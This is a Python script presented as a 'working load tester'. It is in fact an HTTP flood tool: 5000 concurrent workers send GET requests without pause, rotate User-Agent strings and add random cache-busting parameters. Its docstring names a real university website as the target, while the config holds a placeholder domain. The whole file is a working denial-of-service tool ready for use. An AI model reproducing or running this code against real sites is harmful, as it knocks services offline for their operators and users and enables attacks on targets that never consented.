#!/usr/bin/env python3
"""
WORKING LOAD TESTER – Only Port 80, No Proxies
Target: www.ulfg.ul.edu.lb:80
"""

import asyncio
import aiohttp
import random
import time
import threading
import resource
import uvloop

# ========== CONFIG ==========
TARGET_DOMAIN = "www.example.com"
TARGET_PORT = 80
CONCURRENT_TASKS = 5000   # Adjust based on your machine

USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15',
]

# ========== OPTIMIZATIONS ==========
resource.setrlimit(resource.RLIMIT_NOFILE, (1048575, 1048575))
asyncio.set_event_loop_policy(uvloop.EventLoopPolicy())

class SimpleFlood:
    def __init__(self):
        self.running = True
        self.stats = {'success': 0, 'errors': 0, 'bytes': 0}
        self.lock = threading.Lock()
        self.start_time = time.time()

    def update(self, success=True, bytes_sent=0):
        with self.lock:
            if success:
                self.stats['success'] += 1
                self.stats['bytes'] += bytes_sent
            else:
                self.stats['errors'] += 1

    async def flood_worker(self, session):
        """Send HTTP GET requests as fast as possible"""
        while self.running:
            try:
                # Add random path and query to avoid caching
                path = f"/?cache={random.randint(1,10**9)}"
                url = f"http://{TARGET_DOMAIN}:{TARGET_PORT}{path}"
                headers = {'User-Agent': random.choice(USER_AGENTS)}
                async with session.get(url, headers=headers) as resp:
                    # Read content to complete the request (optional)
                    await resp.read()
                    self.update(success=True, bytes_sent=len(url))
            except Exception:
                self.update(success=False)
            await asyncio.sleep(0)  # yield – no delay

    def status_printer(self):
        """Show real-time stats"""
        while self.running:
            with self.lock:
                elapsed = time.time() - self.start_time
                rate = self.stats['success'] / elapsed if elapsed > 0 else 0
                total = self.stats['success'] + self.stats['errors']
                mb = self.stats['bytes'] / (1024*1024)
                print(f"\r[+] Total: {total} | Success: {self.stats['success']} | "
                      f"Errors: {self.stats['errors']} | Rate: {rate:.0f}/s | Data: {mb:.2f} MB", end='')
            time.sleep(1)

    async def run_tasks(self):
        """Create a connection pool and launch workers"""
        connector = aiohttp.TCPConnector(limit=0, limit_per_host=0, ttl_dns_cache=300)
        async with aiohttp.ClientSession(connector=connector) as session:
            tasks = [asyncio.create_task(self.flood_worker(session)) for _ in range(CONCURRENT_TASKS)]
            await asyncio.gather(*tasks)

    def run(self):
        print(f"\n🚀 TARGET: {TARGET_DOMAIN}:{TARGET_PORT}")
        print(f"📈 Concurrent tasks: {CONCURRENT_TASKS}")
        print("Press Ctrl+C to stop\n")
        threading.Thread(target=self.status_printer, daemon=True).start()
        try:
            asyncio.run(self.run_tasks())
        except KeyboardInterrupt:
            self.running = False
            print("\n🛑 Stopped.")

if __name__ == "__main__":
    flood = SimpleFlood()
    flood.run()